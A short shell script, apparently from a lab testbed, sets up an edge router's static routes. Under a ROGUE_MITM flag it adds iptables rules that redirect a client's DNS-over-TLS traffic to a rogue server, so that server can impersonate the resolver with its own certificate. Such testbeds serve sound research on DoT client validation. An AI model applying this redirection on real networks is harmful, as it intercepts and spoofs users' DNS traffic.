#!/bin/sh
# edge-router: install static routes, then -- for attack (ii) -- transparently
# redirect the client's DoT connection (to the resolver) to the rogue DoT server,
# so the attacker gets to present its rogue certificate. No ARP spoofing.
if [ -n "$ROUTES" ]; then
    for r in $ROUTES; do ip route replace "${r%=*}" via "${r#*=}"; done
fi
if [ "${ROGUE_MITM:-0}" = "1" ]; then
    iptables -t nat -A PREROUTING  -p tcp -d 172.16.2.10 --dport 853 -j DNAT --to-destination 172.16.1.101:853
    iptables -t nat -A POSTROUTING -p tcp -d 172.16.1.101 --dport 853 -j MASQUERADE
    echo "edge: ROGUE_MITM=1 -- client DoT redirected to the rogue server (impersonation)"
fi
exec "$@"
